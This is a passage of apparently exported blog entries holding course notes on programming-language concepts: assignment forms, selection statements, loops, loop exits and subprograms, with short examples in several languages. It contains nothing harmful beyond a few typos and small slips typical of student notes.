  <figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">($dog_lover ? $dog_is_da_best : $cat_is_da_best) = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># is equivalent to</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($dog_lover) &#123;</span><br><span class="line">    $dog_is_da_best = <span class="number">1</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $cat_is_da_best = <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Compound Assignment Operators</strong></p>
<ul>
<li>a shorthand method of specifying a commonly needed form of assignment<ul>
<li><code>a = a + b</code> can be simply written as <code>a += b</code></li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Multiple Assignments</strong></p>
<ul>
<li>Python, Perl, and Ruby allow multiple-target multiple-source assignments<ul>
<li><code>a, b, c = 1, 2, 3</code>: assign <code>1</code>, <code>2</code>, <code>3</code> to <code>a</code>, <code>b</code>, <code>c</code></li>
<li><code>a, b = b, a</code>: swap <code>a</code>, <code>b</code></li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Mixed-Mode Assignment</strong></p>
<ul>
<li>allows values of different types to be assigned to each other  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">5</span>;</span><br><span class="line"><span class="type">double</span> y = <span class="number">3.14</span>;</span><br><span class="line">x = y;    <span class="comment">// y is implicitly converted to int, x = 3</span></span><br><span class="line">y = x;    <span class="comment">// x is implicitly converted to double, y = 5.0</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<!-- 
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->
]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
      <tags>
        <tag>CSCI3180</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3180 - Statement-Level Control Structures</title>
    <url>/myBlog/2023/04/26/2023/CSCI3180/2023-4-26-CSCI3180-Statement-Level-Control-Structures/</url>
    <content><![CDATA[<h2 id="Two-Way-Selection-Statements"><a href="#Two-Way-Selection-Statements" class="headerlink" title="Two-Way Selection Statements"></a>Two-Way Selection Statements</h2><ul>
<li><p>provides the means of choosing between two or more paths of execution</p>
</li>
<li><p>General Form:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> control-expression</span><br><span class="line">    <span class="comment">// then-clause</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment">// else-clause</span></span><br></pre></td></tr></table></figure>
<ul>
<li>the control expression must be <code>Boolean</code> in most of the languages</li>
<li>some other languages like <code>C</code> accepts numeric</li>
</ul>
</li>
<li><p>Clause Form:</p>
<ul>
<li>the then-clause and else-clause can be <font color="3A75EA">signle statement</font> or <font color="3A75EA">compound statements</font> in most of the languages</li>
<li>Perl only accepts <font color="3A75EA">compound statements</font></li>
<li>Python and Ruby: clauses are statement sequences</li>
</ul>
</li>
</ul>
<h3 id="Nesting-Selectors"><a href="#Nesting-Selectors" class="headerlink" title="Nesting Selectors"></a>Nesting Selectors</h3><ul>
<li><p><font color="F54747"><strong>Dangling else problem</strong></font></p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> condition1 = <span class="literal">true</span>;</span><br><span class="line"><span class="type">bool</span> condition2 = <span class="literal">false</span>;</span><br><span class="line">string result = <span class="string">&quot;haha&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(condition1)</span><br><span class="line">    <span class="keyword">if</span>(condition2)</span><br><span class="line">        result = <span class="string">&quot;hehe&quot;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    result = <span class="string">&quot;hoho&quot;</span>;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; result &lt;&lt; endl;  <span class="comment">// hoho</span></span><br></pre></td></tr></table></figure>
<ul>
<li>In C&#x2F;C++&#x2F;Java, <code>else</code> matches with the <font color="F54747">nearest previous</font> <code>if</code></li>
</ul>
</li>
<li><p>In Perl, this is actually enforced</p>
  <figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">$condition1 = true;</span><br><span class="line">$condition2 = false;</span><br><span class="line">$result = <span class="string">&quot;haha&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($condition1)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>($condition2)</span><br><span class="line">    &#123;</span><br><span class="line">        $result = <span class="string">&quot;hehe&quot;</span>;</span><br><span class="line">&#125; &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $result = <span class="string">&quot;hoho&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> $result;</span><br></pre></td></tr></table></figure>
</li>
<li><p>In some languages, clauses are statement sequences which are ended by a reserved word <code>end</code></p>
  <figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">condition1 = <span class="literal">true</span></span><br><span class="line">condition2 = <span class="literal">false</span></span><br><span class="line">result = <span class="string">&quot;haha&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> condition1 <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> condition2 <span class="keyword">then</span></span><br><span class="line">        result = <span class="string">&quot;hehe&quot;</span></span><br><span class="line">    <span class="keyword">end</span> </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    result = <span class="string">&quot;hoho&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
</li>
<li><p>In Python,</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">condition1 = <span class="literal">True</span></span><br><span class="line">condition2 = <span class="literal">False</span></span><br><span class="line">result = <span class="string">&quot;haha&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> condition1:</span><br><span class="line">    <span class="keyword">if</span> condition2:</span><br><span class="line">        result = <span class="string">&quot;hehe&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    result = <span class="string">&quot;hoho&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Multiple-Way-Selection"><a href="#Multiple-Way-Selection" class="headerlink" title="Multiple-Way Selection"></a>Multiple-Way Selection</h2><ul>
<li><p>allow the selection of one of any number of statements or statement groups</p>
</li>
<li><p>Switch statement in C, C++, and Java</p>
<ul>
<li><p>Control expression and case constants can only be <font color="3A75EA">integers</font></p>
</li>
<li><p><code>default</code> clause is for unrepresented values</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (expression) &#123;</span><br><span class="line">    <span class="keyword">case</span> const_expr_1:</span><br><span class="line">        statement_1;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> const_expr_n:</span><br><span class="line">        statement_n;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        statement_n+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Placement</strong></p>
<ul>
<li><code>switch-case</code> has no restructions on the placement of the case expression  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">37</span>;</span><br><span class="line"><span class="keyword">switch</span>(x)</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isPrime</span>(x))  <span class="comment">// skip the if statement</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: <span class="keyword">case</span> <span class="number">3</span>: <span class="keyword">case</span> <span class="number">5</span>: <span class="keyword">case</span> <span class="number">7</span>: <span class="comment">// quick jump</span></span><br><span class="line">        <span class="built_in">processPrime</span>(x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: <span class="keyword">case</span> <span class="number">6</span>: <span class="keyword">case</span> <span class="number">8</span>: <span class="keyword">case</span> <span class="number">9</span>: <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        <span class="built_in">processComposite</span>(x);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><p>unconditional branch in C#</p>
<ul>
<li>C# allows unconditional branch like <code>goto</code> and <code>break</code>  <figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> <span class="keyword">value</span> = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">int</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">switch</span>(<span class="keyword">value</span>)&#123;</span><br><span class="line"><span class="keyword">case</span> &lt; <span class="number">0</span>:</span><br><span class="line">    result += <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">    result += <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">goto</span> <span class="keyword">case</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    result += <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="literal">default</span>:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Multiple Selector in two-way selectors:</p>
<ul>
<li><p>the connection of two-way selections using <code>else if</code></p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> n = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;one&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">2</span>)&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;two&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;three&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>but the structure is more look like this (which is <font color="3A75EA">not an actual multiple-way selection</font>)</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> n = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;one&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;two&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">3</span>)&#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;three&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>In Python, <code>elif</code> is a single special keyword and enables <font color="F54747"><strong>actual multiple-way selection</strong></font></p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;one&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> n == <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;two&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> n == <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;three&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Implementation</strong></p>
<ul>
<li>General approach<ul>
<li>multiple conditional branches</li>
<li>linear search of a simple table of case values</li>
</ul>
</li>
<li>Optimized approaches<ul>
<li>array</li>
<li>hash table</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Counter-Controlled-Loops"><a href="#Counter-Controlled-Loops" class="headerlink" title="Counter-Controlled Loops"></a>Counter-Controlled Loops</h2><ul>
<li>has a loop variable, and a means of specifying the initial, condition, and step</li>
<li>C-based language Syntax: <code>for ([initial] ; [condition] ; [step]) body</code><ul>
<li><p>the <code>[initial]</code>, <code>[condition]</code> and <code>[step]</code> can be whole statements or even statement sequences(statement seperated by <code>,</code>)</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++, j += <span class="number">2</span>)&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;loop &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; j &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>It can even has no statements</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;)&#123;   <span class="comment">// while(true)</span></span><br><span class="line">    <span class="comment">// body</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (;A;)&#123;  <span class="comment">// while(A)</span></span><br><span class="line">    <span class="comment">// body</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>It is legal for C++ to go back to the loop body using <code>goto</code></p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    print:</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;loop &quot;</span> &lt;&lt; i &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;one more time?&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="type">char</span> input;</span><br><span class="line">cin &gt;&gt; input;</span><br><span class="line"><span class="keyword">if</span> (input == <span class="string">&#x27;y&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">goto</span> print;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Logic-Driven-Loops"><a href="#Logic-Driven-Loops" class="headerlink" title="Logic-Driven Loops"></a>Logic-Driven Loops</h2><ul>
<li><p>the repetition control is based on a Boolean expression</p>
</li>
<li><p><font color="F54747"><strong>Pretest Loop</strong></font></p>
<ul>
<li>check the loop condition before the first iteration</li>
<li><code>while</code> loop  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (control_expression) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><font color="F54747"><strong>Posttest Loop</strong></font></p>
<ul>
<li>check the loop condition after the first iteration</li>
<li><code>do-while</code> loop  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125; <span class="keyword">while</span> (control_expression)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>It is also legal for C++ to go back to the loop body using <code>goto</code></p>
</li>
</ul>
<h2 id="Data-Structure-Based-Loops"><a href="#Data-Structure-Based-Loops" class="headerlink" title="Data-Structure-Based Loops"></a>Data-Structure-Based Loops</h2><ul>
<li><p>the number of elements in a data structure controls loop iteration</p>
</li>
<li><p>call to an <font color="3A75EA">iterator function</font> or a <font color="3A75EA">callable object</font> that returns the next element in some chosen order, if there is one; else loop is terminated</p>
</li>
<li><p>Implement using pointer in C</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (node* p=root; p!=<span class="literal">NULL</span>; traverse(p))&#123;</span><br><span class="line">    <span class="comment">// use *p to access the current element</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Standard Template Library</strong> in C++</p>
<ul>
<li>instead of dealing with pointer, STL iterators can simply using the deference operator <code>*</code> and increment operators <code>++</code>  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator p=v.<span class="built_in">begin</span>(); p!=v.<span class="built_in">end</span>(); p++) &#123;</span><br><span class="line">    <span class="comment">// use *p to access the current element</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Java Implementation</p>
<ul>
<li><p>the class that implements the Iterable interface (<code>ArrayList</code>)</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (String myElement : myList)&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>forEach</code> method</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">myList.forEach((n) -&gt; &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Python Implementation</p>
<ul>
<li><p>The loop variable takes on the values specified in the given sequence</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> loop_variable <span class="keyword">in</span> sequence:</span><br><span class="line">    <span class="comment"># loop_body</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>else clause is execute if the loop terminates normally</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pets = [<span class="string">&quot;kitty&quot;</span>, <span class="string">&quot;doggy&quot;</span>, <span class="string">&quot;pig&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pet <span class="keyword">in</span> pets:</span><br><span class="line">    <span class="keyword">if</span> pet == <span class="string">&quot;piggy&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;piggy is found!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:   <span class="comment"># if the loop terminates normally</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no piggy&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>similate counter-controlled loop</strong></p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="User-Located-Loop-Control-Mechanisms"><a href="#User-Located-Loop-Control-Mechanisms" class="headerlink" title="User-Located Loop Control Mechanisms"></a>User-Located Loop Control Mechanisms</h2><ol>
<li><p>unconditional unlabeled exits (<code>break</code> in most of the languages, <code>last</code> in Perl)</p>
<ul>
<li>exit the loop</li>
</ul>
</li>
<li><p>unlabeled control statement (<code>continue</code>)</p>
<ul>
<li>skips the the remainder of the current iteration, <font color="3A75EA">but does not exit the loop</font></li>
</ul>
</li>
<li><p>Labeled exits</p>
<ul>
<li>consider the <code>break</code> can only exist for the current loop but cannot exit the outer loop</li>
<li>we can label the outer loop and then use <code>break label;</code> to exit the outer loop  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">outerLoop:</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">5</span>; j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i + j == <span class="number">5</span>)&#123;</span><br><span class="line">            System.out.println(i + <span class="string">&quot; &quot;</span> + j);</span><br><span class="line">            <span class="keyword">break</span> outerLoop;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>If <code>goto</code> is legal, then simply use <code>goto</code> to exit the outer loop</li>
</ul>
</li>
</ol>
<!-- 
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->
]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
      <tags>
        <tag>CSCI3180</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3180 - Subprogram</title>
    <url>/myBlog/2023/04/27/2023/CSCI3180/2023-4-27-CSCI3180-Subprogram/</url>
    <content><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><h3 id="Procedure-amp-Function"><a href="#Procedure-amp-Function" class="headerlink" title="Procedure &amp; Function"></a>Procedure &amp; Function</h3><ul>
<li>Subprograms are collections of statements that define parameterized computations</li>
<li>There are two kinds of subprograms:<ol>
<li><font color="3A75EA">Functions</font> return values</li>
<li><font color="3A75EA">Procedure</font> do not</li>
</ol>
</li>
<li>In most of the languages do not include procedures as a separate form of subprogram (functions that can be defined not to return values can be used as procedures)</li>
</ul>
<h3 id="Execution"><a href="#Execution" class="headerlink" title="Execution"></a>Execution</h3><ul>
<li>Each subprogram has a single entry point</li>
<li>The calling subprogram is <font color="F54747">suspended</font> during execution of the called subprogram (i.e., <font color="F54747">there is only one subprogram in execution in the given time</font>)</li>
<li>Except the program is terminated, control always return to the <font color="F54747">caller</font> at the <font color="3A75EA">subprogram called statement</font> when the called subprogram’s execution terminate</li>
</ul>
<h3 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h3><ul>
<li><p><font color="3A75EA"><strong>Subprogram Definition</strong></font></p>
<ul>
<li><p>describes the interface to and the actions of the subprogram abstraction</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;haha&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>f</code> is the definition of this subprogram</li>
</ul>
</li>
<li><p>In Python, function definitions are <font color="F54747"><strong>executable</strong></font></p>
</li>
<li><p>In all other languages, they are <font color="F54747"><strong>non-executable</strong></font></p>
</li>
<li><p>Executable function definition:</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">is_advanced_operator_allowed = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> is_advanced_operator_allowed:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_even</span>(<span class="params">n</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;thinking...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> n % <span class="number">2</span> == <span class="number">0</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_even</span>(<span class="params">n</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;thinking...&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> n == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> is_even(n-<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(is_even(<span class="number">10</span>))</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Subprogram Call</strong></font></p>
<ul>
<li>an explicit request that the subprogram be executed (<code>fun()</code>)</li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Subprogram Header</strong></font></p>
<ul>
<li>the first part of the definition, including the <font color="3A75EA">name</font>, the kind of subprogram, and the <font color="3A75EA">parameters</font></li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Parameter Profile</strong></font></p>
<ul>
<li>the number, order, and types of its parameters</li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Protocol</strong></font></p>
<ul>
<li>the parameter profile and the return type</li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Subprogram Declaration</strong></font></p>
<ul>
<li>the protocol of the subprogram (prototype in C&#x2F;C++)  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sum</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span></span>;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Parameter</strong></font> (formal parameter)</p>
<ul>
<li>a variable listed in the subprogram header and used in the subprogram  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123; &#125;  <span class="comment">// a and b are the parameters</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Argument</strong></font> (actual parameter)</p>
<ul>
<li>the actual input supplied in the subprogram call statement to the subprogram  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span>(<span class="number">14</span>, <span class="number">23</span>) <span class="comment">// arguments</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Correspondence"><a href="#Correspondence" class="headerlink" title="Correspondence"></a>Correspondence</h2><ol>
<li><p><font color="3A75EA"><strong>Positional</strong></font></p>
<ul>
<li>the binding of arguments to parameters is by <font color="3A75EA">position</font></li>
<li><strong>Advantage</strong>: Simple and effective</li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Keyword</strong></font> (in Python, JavaScript, C#)</p>
<ul>
<li>the name of the parameter is in form of a keyword, to which an argument is to be bound is specified with the argument  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;a is&quot;</span>, a)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;b is&quot;</span>, b)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c is&quot;</span>, c)</span><br><span class="line"></span><br><span class="line">f(b=<span class="number">1</span>, a=<span class="number">2</span>, c=<span class="number">3</span>)</span><br><span class="line">f(<span class="number">3</span>, c=<span class="number">9</span>, b=<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li>
<li><strong>Advantage</strong>: arguments can appear in different order</li>
<li><strong>Disadvantage</strong>: users are able to know the parameter’s names</li>
</ul>
</li>
</ol>
<h2 id="Parameter-Default-Values"><a href="#Parameter-Default-Values" class="headerlink" title="Parameter Default Values"></a>Parameter Default Values</h2><ul>
<li>parameters can have default values if no argument is passed</li>
<li><font color="3A75EA"><strong>Note</strong></font>: the default parameters must <font color="F54747">appear last</font>(because parameters are positionally associated)</li>
<li><font color="F54747"><strong>Remind</strong></font>: the default parameters should be assign in subprogram declaration (if have)<ul>
<li><p>default parameter in C++</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sum</span><span class="params">(<span class="type">int</span>, <span class="type">int</span> = <span class="number">3</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">sum</span>(<span class="number">1</span>) &lt;&lt; endl; <span class="comment">// 4</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>list of variable number of parameters in Python (<code>*</code>)</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">x, *args</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(args))   <span class="comment"># tuple</span></span><br><span class="line">    <span class="built_in">print</span>(x, args)  <span class="comment"># 1, (2, 3, &quot;dq&quot;)</span></span><br><span class="line"></span><br><span class="line">fun(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&quot;dq&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>named keyword argument in Python (<code>**</code>)</p>
